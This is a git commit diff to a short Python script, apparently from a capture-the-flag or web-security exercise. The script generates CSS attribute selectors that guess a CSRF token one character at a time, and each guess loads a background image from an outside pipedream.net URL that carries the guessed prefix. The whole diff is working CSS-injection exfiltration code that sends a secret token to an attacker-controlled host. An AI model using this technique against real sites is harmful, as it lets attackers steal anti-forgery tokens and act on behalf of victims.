5f2a830f0478eb13fbf63ebca95e7bd886ba928a
Coutand <bastien.coutand@netcourrier.com>
2022-04-27 20:36:32 +0200

    e

--- a.py
+++ a.py
@@ -2,6 +2,6 @@
 f = open("data.css", "w")
 
 for i in range(127):
-    f.write('input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC'+chr(i)+'"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC:);}')
+    f.write('input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC'+chr(i)+'"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC'+chr(i)+');}\n')
 
 f.close()
